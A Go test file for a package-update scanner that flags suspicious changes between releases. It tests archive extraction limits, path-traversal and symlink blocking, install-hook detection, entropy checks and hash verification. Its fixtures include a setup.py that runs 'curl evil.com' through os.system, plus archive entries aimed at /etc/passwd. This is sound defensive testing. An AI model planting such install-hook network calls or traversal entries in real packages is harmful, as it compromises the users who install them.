package versiondiff

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/cloudfieldcz/shieldoo-gate/internal/config"
	"github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// --- Extractor tests ---

func TestExtractZip_ValidArchive_ExtractsFiles(t *testing.T) {
	zipPath := createTestZip(t, map[string]string{
		"hello.py": "print('hello')",
		"sub/lib.py": "def foo(): pass",
	})
	destDir := t.TempDir()
	limits := ExtractLimits{MaxSizeMB: 10, MaxFiles: 100}

	err := ExtractArchive(zipPath, destDir, limits)
	require.NoError(t, err)

	assert.FileExists(t, filepath.Join(destDir, "hello.py"))
	assert.FileExists(t, filepath.Join(destDir, "sub", "lib.py"))
}

func TestExtractZip_PathTraversal_ReturnsError(t *testing.T) {
	zipPath := createTestZipWithNames(t, map[string][]byte{
		"../etc/passwd": []byte("root:x:0:0"),
	})
	destDir := t.TempDir()
	limits := ExtractLimits{MaxSizeMB: 10, MaxFiles: 100}

	err := ExtractArchive(zipPath, destDir, limits)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "path traversal")
}

func TestExtractZip_ExceedsMaxSize_ReturnsError(t *testing.T) {
	// Create a zip with a 2MB file but set limit to 1MB
	bigContent := make([]byte, 2*1024*1024)
	for i := range bigContent {
		bigContent[i] = 'A'
	}
	zipPath := createTestZipWithNames(t, map[string][]byte{
		"big.bin": bigContent,
	})
	destDir := t.TempDir()
	limits := ExtractLimits{MaxSizeMB: 1, MaxFiles: 100}

	err := ExtractArchive(zipPath, destDir, limits)
	assert.Error(t, err)
}

func TestExtractZip_ExceedsMaxFiles_ReturnsError(t *testing.T) {
	files := make(map[string]string)
	for i := 0; i < 10; i++ {
		files["file"+string(rune('a'+i))+".txt"] = "content"
	}
	zipPath := createTestZip(t, files)
	destDir := t.TempDir()
	limits := ExtractLimits{MaxSizeMB: 10, MaxFiles: 3}

	err := ExtractArchive(zipPath, destDir, limits)
	assert.Error(t, err)
}

func TestExtractTarGz_ValidArchive_ExtractsFiles(t *testing.T) {
	tgzPath := createTestTarGz(t, map[string]string{
		"main.js": "console.log('hi')",
		"lib/util.js": "module.exports = {}",
	})
	destDir := t.TempDir()
	limits := ExtractLimits{MaxSizeMB: 10, MaxFiles: 100}

	err := ExtractArchive(tgzPath, destDir, limits)
	require.NoError(t, err)

	assert.FileExists(t, filepath.Join(destDir, "main.js"))
	assert.FileExists(t, filepath.Join(destDir, "lib", "util.js"))
}

func TestExtractTarGz_Symlink_ReturnsError(t *testing.T) {
	tgzPath := createTestTarGzWithSymlink(t)
	destDir := t.TempDir()
	limits := ExtractLimits{MaxSizeMB: 10, MaxFiles: 100}

	err := ExtractArchive(tgzPath, destDir, limits)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "symlink")
}

func TestSanitizePath_DotDot_ReturnsError(t *testing.T) {
	_, err := safePath("../../../etc/passwd", "/tmp/safe")
	assert.Error(t, err)
}

func TestSanitizePath_AbsolutePath_ReturnsError(t *testing.T) {
	_, err := safePath("/etc/passwd", "/tmp/safe")
	assert.Error(t, err)
}

func TestSanitizePath_Valid_ReturnsCleanPath(t *testing.T) {
	dest := t.TempDir()
	path, err := safePath("sub/file.txt", dest)
	require.NoError(t, err)
	assert.Equal(t, filepath.Join(dest, "sub", "file.txt"), path)
}

// --- Diff strategy tests ---

func TestFileInventoryDiff_AddedAndRemoved_DetectsChanges(t *testing.T) {
	oldDir := t.TempDir()
	newDir := t.TempDir()

	writeTestFile(t, oldDir, "a.py", "old")
	writeTestFile(t, oldDir, "b.py", "shared")
	writeTestFile(t, newDir, "b.py", "shared")
	writeTestFile(t, newDir, "c.py", "new")

	oldFiles := walkDir(oldDir)
	newFiles := walkDir(newDir)
	added, removed, modified := fileInventoryDiff(oldDir, newDir, oldFiles, newFiles)

	assert.Contains(t, added, "c.py")
	assert.Contains(t, removed, "a.py")
	assert.Empty(t, modified) // b.py is same content
}

func TestFileInventoryDiff_ModifiedFile_Detected(t *testing.T) {
	oldDir := t.TempDir()
	newDir := t.TempDir()

	writeTestFile(t, oldDir, "lib.py", "version1")
	writeTestFile(t, newDir, "lib.py", "version2-with-changes")

	oldFiles := walkDir(oldDir)
	newFiles := walkDir(newDir)
	_, _, modified := fileInventoryDiff(oldDir, newDir, oldFiles, newFiles)

	assert.Contains(t, modified, "lib.py")
}

func TestSizeAnomalyCheck_LargeRatio_DetectsAnomaly(t *testing.T) {
	oldDir := t.TempDir()
	newDir := t.TempDir()

	writeTestFile(t, oldDir, "small.py", "x")
	writeTestFile(t, newDir, "big.py", strings.Repeat("A", 1000))

	oldFiles := walkDir(oldDir)
	newFiles := walkDir(newDir)
	ratio := sizeAnomalyCheck(oldDir, newDir, oldFiles, newFiles)

	assert.Greater(t, ratio, 5.0)
}

func TestSizeAnomalyCheck_NormalRatio_NoAnomaly(t *testing.T) {
	oldDir := t.TempDir()
	newDir := t.TempDir()

	writeTestFile(t, oldDir, "a.py", "hello world")
	writeTestFile(t, newDir, "a.py", "hello world!")

	oldFiles := walkDir(oldDir)
	newFiles := walkDir(newDir)
	ratio := sizeAnomalyCheck(oldDir, newDir, oldFiles, newFiles)

	assert.Less(t, ratio, 2.0)
}

func TestSensitiveFileChanges_PyPI_SetupPy_ReturnsCritical(t *testing.T) {
	modified := []string{"setup.py"}
	added := []string{}
	changed, findings := sensitiveFileChanges(scanner.EcosystemPyPI, modified, added, nil)

	assert.Contains(t, changed, "setup.py")
	require.NotEmpty(t, findings)
	assert.Equal(t, scanner.SeverityCritical, findings[0].Severity)
}

func TestSensitiveFileChanges_NPM_PostInstall_ReturnsCritical(t *testing.T) {
	modified := []string{}
	added := []string{"postinstall.sh"}
	changed, findings := sensitiveFileChanges(scanner.EcosystemNPM, modified, added, nil)

	assert.Contains(t, changed, "postinstall.sh")
	require.NotEmpty(t, findings)
	assert.Equal(t, scanner.SeverityCritical, findings[0].Severity)
}

func TestSensitiveFileChanges_NuGet_TargetsFile_ReturnsMedium(t *testing.T) {
	modified := []string{}
	added := []string{"buildTransitive/net6.0/System.Text.Json.targets"}
	changed, findings := sensitiveFileChanges(scanner.EcosystemNuGet, modified, added, nil)

	assert.Contains(t, changed, "buildTransitive/net6.0/System.Text.Json.targets")
	require.NotEmpty(t, findings)
	assert.Equal(t, scanner.SeverityMedium, findings[0].Severity,
		".targets files are standard MSBuild metadata, not executable hooks — should be MEDIUM, not HIGH")
}

func TestSensitiveFileChanges_NuGet_PropsFile_ReturnsMedium(t *testing.T) {
	modified := []string{"build/Foo.props"}
	added := []string{}
	changed, findings := sensitiveFileChanges(scanner.EcosystemNuGet, modified, added, nil)

	assert.Contains(t, changed, "build/Foo.props")
	require.NotEmpty(t, findings)
	assert.Equal(t, scanner.SeverityMedium, findings[0].Severity,
		".props files are standard MSBuild metadata, not executable hooks — should be MEDIUM, not HIGH")
}

func TestSensitiveFileChanges_NuGet_InstallPs1_ReturnsCritical(t *testing.T) {
	modified := []string{}
	added := []string{"tools/install.ps1"}
	changed, findings := sensitiveFileChanges(scanner.EcosystemNuGet, modified, added, nil)

	assert.Contains(t, changed, "tools/install.ps1")
	require.NotEmpty(t, findings)
	assert.Equal(t, scanner.SeverityCritical, findings[0].Severity,
		"install.ps1 is a PowerShell install hook — must stay CRITICAL")
}

func TestShannonEntropy_HighEntropy_ReturnsAbove6(t *testing.T) {
	// Random data has high entropy (~8 bits/byte)
	data := make([]byte, 1024)
	_, err := rand.Read(data)
	require.NoError(t, err)

	ent := shannonEntropy(data)
	assert.Greater(t, ent, 6.0)
}

func TestShannonEntropy_LowEntropy_ReturnsBelow4(t *testing.T) {
	// Repetitive data has low entropy
	data := bytes.Repeat([]byte("hello "), 100)
	ent := shannonEntropy(data)
	assert.Less(t, ent, 4.0)
}

func TestShannonEntropy_Empty_ReturnsZero(t *testing.T) {
	ent := shannonEntropy([]byte{})
	assert.Equal(t, 0.0, ent)
}

func TestEntropyAnalysis_SkipsBinaryFiles(t *testing.T) {
	newDir := t.TempDir()
	// Create a high-entropy PNG file
	randomData := make([]byte, 512)
	rand.Read(randomData)
	writeTestFileBytes(t, newDir, "image.png", randomData)

	var findings []scanner.Finding
	_ = entropyAnalysis("", newDir, nil, []string{"image.png"}, 8192, 2.0, &findings)

	assert.Empty(t, findings) // PNG should be skipped
}

func TestNewDependencyDetection_NPM_PackageJson_FindsNewDeps(t *testing.T) {
	oldDir := t.TempDir()
	newDir := t.TempDir()

	writeTestFile(t, oldDir, "package.json", `{"dependencies":{"express":"^4.0.0"}}`)
	writeTestFile(t, newDir, "package.json", `{"dependencies":{"express":"^4.0.0","evil-pkg":"^1.0.0"}}`)

	newDeps, findings := newDependencyDetection(scanner.EcosystemNPM, oldDir, newDir)

	assert.Contains(t, newDeps, "evil-pkg")
	assert.NotEmpty(t, findings)
}

// --- Scoring tests ---

func TestScoreFindings_CriticalFinding_ReturnsSuspicious(t *testing.T) {
	dr := DiffResult{
		Findings: []scanner.Finding{
			{Severity: scanner.SeverityCritical, Category: "test"},
		},
	}
	verdict, confidence := scoreFindings(dr)
	assert.Equal(t, scanner.VerdictSuspicious, verdict)
	assert.InDelta(t, 0.90, confidence, 0.01)
}

func TestScoreFindings_HighFinding_ReturnsSuspicious(t *testing.T) {
	dr := DiffResult{
		Findings: []scanner.Finding{
			{Severity: scanner.SeverityHigh, Category: "test"},
		},
	}
	verdict, confidence := scoreFindings(dr)
	assert.Equal(t, scanner.VerdictSuspicious, verdict)
	assert.InDelta(t, 0.80, confidence, 0.01)
}

func TestScoreFindings_NoFindings_ReturnsClean(t *testing.T) {
	dr := DiffResult{}
	verdict, confidence := scoreFindings(dr)
	assert.Equal(t, scanner.VerdictClean, verdict)
	assert.InDelta(t, 1.0, confidence, 0.01)
}

// --- Scanner tests ---

func TestVersionDiffScanner_SupportedEcosystems(t *testing.T) {
	s := &VersionDiffScanner{}
	ecosystems := s.SupportedEcosystems()
	assert.Contains(t, ecosystems, scanner.EcosystemPyPI)
	assert.Contains(t, ecosystems, scanner.EcosystemNPM)
	assert.Contains(t, ecosystems, scanner.EcosystemNuGet)
	assert.NotContains(t, ecosystems, scanner.EcosystemDocker)
}

func TestVersionDiffScanner_NameAndVersion(t *testing.T) {
	s := &VersionDiffScanner{}
	assert.Equal(t, "version-diff", s.Name())
	assert.Equal(t, "1.0.0", s.Version())
}

func TestNewVersionDiffScanner_NilDB_ReturnsError(t *testing.T) {
	_, err := NewVersionDiffScanner(nil, nil, config.VersionDiffConfig{})
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "db is nil")
}

func TestVerifySHA256_CorrectHash_NoError(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "test.bin")
	content := []byte("hello world")
	require.NoError(t, os.WriteFile(path, content, 0600))

	h := sha256.Sum256(content)
	expected := hex.EncodeToString(h[:])

	err := verifySHA256(path, expected)
	assert.NoError(t, err)
}

func TestVerifySHA256_WrongHash_ReturnsError(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "test.bin")
	require.NoError(t, os.WriteFile(path, []byte("hello"), 0600))

	err := verifySHA256(path, "0000000000000000000000000000000000000000000000000000000000000000")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "mismatch")
}

func TestVerifySHA256_EmptyExpected_NoError(t *testing.T) {
	err := verifySHA256("/nonexistent", "")
	assert.NoError(t, err)
}

// --- RunDiff integration test ---

func TestRunDiff_CleanUpdate_NoFindings(t *testing.T) {
	oldDir := t.TempDir()
	newDir := t.TempDir()

	// Same files, minor change
	writeTestFile(t, oldDir, "lib.py", "def foo(): return 1")
	writeTestFile(t, newDir, "lib.py", "def foo(): return 2")

	thresholds := config.VersionDiffThresholds{
		CodeVolumeRatio: 5.0,
		MaxNewFiles:     20,
		EntropyDelta:    2.0,
	}

	dr := RunDiff(oldDir, newDir, scanner.EcosystemPyPI, thresholds, nil, 8192)
	assert.Equal(t, 0, dr.FilesAdded)
	assert.Equal(t, 0, dr.FilesRemoved)
	assert.Equal(t, 1, dr.FilesModified)
	assert.Empty(t, dr.Findings)
}

func TestRunDiff_SuspiciousUpdate_HasFindings(t *testing.T) {
	oldDir := t.TempDir()
	newDir := t.TempDir()

	// Old version: simple lib
	writeTestFile(t, oldDir, "lib.py", "def foo(): return 1")

	// New version: added setup.py (critical) and many new files
	writeTestFile(t, newDir, "lib.py", "def foo(): return 1")
	writeTestFile(t, newDir, "setup.py", "import os; os.system('curl evil.com')")

	thresholds := config.VersionDiffThresholds{
		CodeVolumeRatio: 5.0,
		MaxNewFiles:     20,
		EntropyDelta:    2.0,
	}

	dr := RunDiff(oldDir, newDir, scanner.EcosystemPyPI, thresholds, nil, 8192)
	assert.Equal(t, 1, dr.FilesAdded) // setup.py
	assert.NotEmpty(t, dr.Findings)

	// Should have a critical finding for setup.py
	hasCritical := false
	for _, f := range dr.Findings {
		if f.Severity == scanner.SeverityCritical {
			hasCritical = true
		}
	}
	assert.True(t, hasCritical, "expected critical finding for new setup.py")
}

// --- Test helpers ---

func writeTestFile(t *testing.T, dir, name, content string) {
	t.Helper()
	path := filepath.Join(dir, name)
	require.NoError(t, os.MkdirAll(filepath.Dir(path), 0700))
	require.NoError(t, os.WriteFile(path, []byte(content), 0600))
}

func writeTestFileBytes(t *testing.T, dir, name string, content []byte) {
	t.Helper()
	path := filepath.Join(dir, name)
	require.NoError(t, os.MkdirAll(filepath.Dir(path), 0700))
	require.NoError(t, os.WriteFile(path, content, 0600))
}

func createTestZip(t *testing.T, files map[string]string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "test.zip")
	f, err := os.Create(path)
	require.NoError(t, err)
	defer f.Close()

	w := zip.NewWriter(f)
	for name, content := range files {
		fw, err := w.Create(name)
		require.NoError(t, err)
		_, err = fw.Write([]byte(content))
		require.NoError(t, err)
	}
	require.NoError(t, w.Close())
	return path
}

func createTestZipWithNames(t *testing.T, files map[string][]byte) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "test.zip")
	f, err := os.Create(path)
	require.NoError(t, err)
	defer f.Close()

	w := zip.NewWriter(f)
	for name, content := range files {
		fw, err := w.Create(name)
		require.NoError(t, err)
		_, err = fw.Write(content)
		require.NoError(t, err)
	}
	require.NoError(t, w.Close())
	return path
}

func createTestTarGz(t *testing.T, files map[string]string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "test.tgz")
	f, err := os.Create(path)
	require.NoError(t, err)
	defer f.Close()

	gw := gzip.NewWriter(f)
	tw := tar.NewWriter(gw)

	for name, content := range files {
		require.NoError(t, tw.WriteHeader(&tar.Header{
			Name:     name,
			Size:     int64(len(content)),
			Mode:     0600,
			Typeflag: tar.TypeReg,
		}))
		_, err := tw.Write([]byte(content))
		require.NoError(t, err)
	}

	require.NoError(t, tw.Close())
	require.NoError(t, gw.Close())
	return path
}

func createTestTarGzWithSymlink(t *testing.T) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "test.tgz")
	f, err := os.Create(path)
	require.NoError(t, err)
	defer f.Close()

	gw := gzip.NewWriter(f)
	tw := tar.NewWriter(gw)

	require.NoError(t, tw.WriteHeader(&tar.Header{
		Name:     "evil-link",
		Linkname: "/etc/passwd",
		Typeflag: tar.TypeSymlink,
		Mode:     0777,
	}))

	require.NoError(t, tw.Close())
	require.NoError(t, gw.Close())
	return path
}

// Helpers to consume io without import issues
var _ = io.Discard
